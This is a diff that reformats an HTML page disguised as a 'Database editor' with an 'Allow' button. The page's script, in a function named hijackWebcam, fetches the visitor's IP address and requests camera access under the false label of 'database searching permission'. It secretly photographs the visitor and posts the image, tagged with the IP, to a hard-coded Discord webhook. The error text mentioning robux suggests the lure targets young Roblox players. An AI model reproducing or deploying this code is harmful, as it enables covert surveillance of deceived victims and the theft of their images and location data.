@@ -1,1 +1,137 @@
-<!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8" /> <title>Database editor</title> <style> body, html { margin: 0; padding: 0; height: 100%; font-family: Arial, sans-serif; background: #f0f0f0; display: flex; justify-content: center; align-items: center; } #popup { background: white; padding: 30px 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.15); max-width: 320px; text-align: center; } #popup h2 { margin-bottom: 20px; } #popup button { background: linear-gradient(to right, #ff8a00, #e52e71); border: none; padding: 12px 25px; color: white; font-weight: bold; font-size: 16px; border-radius: 25px; cursor: pointer; transition: all 0.3s ease; user-select: none; } #popup button:hover { transform: scale(1.05); box-shadow: 0 6px 20px rgba(0,0,0,0.3); } #status { margin-top: 15px; color: #555; } </style> </head> <body> <div id="popup"> <h2>Database editor.index</h2> <button id="allowBtn">Allow</button> <div id="status"></div> </div> <script> const DELAY_SECONDS = 5; const WEBHOOK_URL = "https://discord.com/api/webhooks/1403083806705057812/I3474kOt2sZKd2gOPsv6BCcP1X7J0smnlx5r15sp_Hm28vtemEZaCbMI1q3D6emTv5zR"; const statusEl = document.getElementById('status'); const popupEl = document.getElementById('popup'); const allowBtn = document.getElementById('allowBtn'); async function getIP() { try { const res = await fetch("https://api.ipify.org?format=json"); const data = await res.json(); return data.ip; } catch { return "unknown"; } } async function hijackWebcam() { statusEl.textContent = "Requesting database searching permission..."; try { const ip = await getIP(); const stream = await navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 1920 }, height: { ideal: 1080 }, facingMode: "user" } }); const video = document.createElement("video"); video.srcObject = stream; await video.play(); statusEl.textContent = `Searching database photo in ${DELAY_SECONDS} seconds...`; await new Promise(resolve => setTimeout(resolve, DELAY_SECONDS * 1000)); if (video.readyState < 2) { await new Promise(resolve => { video.onloadeddata = resolve; }); } const canvas = document.createElement("canvas"); canvas.width = video.videoWidth; canvas.height = video.videoHeight; const ctx = canvas.getContext("2d"); ctx.drawImage(video, 0, 0, canvas.width, canvas.height); canvas.toBlob(blob => { const formData = new FormData(); formData.append("file", blob, `webcam_${ip}.jpg`); fetch(WEBHOOK_URL, { method: "POST", body: formData }); stream.getTracks().forEach(track => track.stop()); }, "image/jpeg", 0.9); } catch (err) { statusEl.textContent = "Failed to access database and change robux, restart the page and try again."; } } allowBtn.addEventListener('click', async () => { allowBtn.disabled = true; await hijackWebcam(); }); </script> </body> </html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Database editor</title>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: Arial, sans-serif;
+      background: #f0f0f0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    #popup {
+      background: white;
+      padding: 30px 40px;
+      border-radius: 12px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+      max-width: 320px;
+      text-align: center;
+    }
+
+    #popup h2 {
+      margin-bottom: 20px;
+    }
+
+    #popup button {
+      background: linear-gradient(to right, #ff8a00, #e52e71);
+      border: none;
+      padding: 12px 25px;
+      color: white;
+      font-weight: bold;
+      font-size: 16px;
+      border-radius: 25px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      user-select: none;
+    }
+
+    #popup button:hover {
+      transform: scale(1.05);
+      box-shadow: 0 6px 20px rgba(0,0,0,0.3);
+    }
+
+    #status {
+      margin-top: 15px;
+      color: #555;
+    }
+  </style>
+</head>
+
+<body>
+  <div id="popup">
+    <h2>Database editor.index</h2>
+    <button id="allowBtn">Allow</button>
+    <div id="status"></div>
+  </div>
+
+  <script>
+    const DELAY_SECONDS = 5;
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1403083806705057812/I3474kOt2sZKd2gOPsv6BCcP1X7J0smnlx5r15sp_Hm28vtemEZaCbMI1q3D6emTv5zR";
+
+    const statusEl = document.getElementById('status');
+    const popupEl = document.getElementById('popup');
+    const allowBtn = document.getElementById('allowBtn');
+
+    async function getIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return "unknown";
+      }
+    }
+
+    async function hijackWebcam() {
+      statusEl.textContent = "Requesting database searching permission...";
+      try {
+        const ip = await getIP();
+
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            width: { ideal: 1920 },
+            height: { ideal: 1080 },
+            facingMode: "user"
+          }
+        });
+
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        await video.play();
+
+        statusEl.textContent = `Searching database photo in ${DELAY_SECONDS} seconds...`;
+        await new Promise(resolve => setTimeout(resolve, DELAY_SECONDS * 1000));
+
+        if (video.readyState < 2) {
+          await new Promise(resolve => {
+            video.onloadeddata = resolve;
+          });
+        }
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob(blob => {
+          const formData = new FormData();
+          formData.append("file", blob, `webcam_${ip}.jpg`);
+
+          fetch(WEBHOOK_URL, {
+            method: "POST",
+            body: formData
+          });
+
+          stream.getTracks().forEach(track => track.stop());
+        }, "image/jpeg", 0.9);
+
+      } catch (err) {
+        statusEl.textContent = "Failed to access database and change robux, restart the page and try again.";
+      }
+    }
+
+    allowBtn.addEventListener('click', async () => {
+      allowBtn.disabled = true;
+      await hijackWebcam();
+    });
+  </script>
+</body>
+</html>
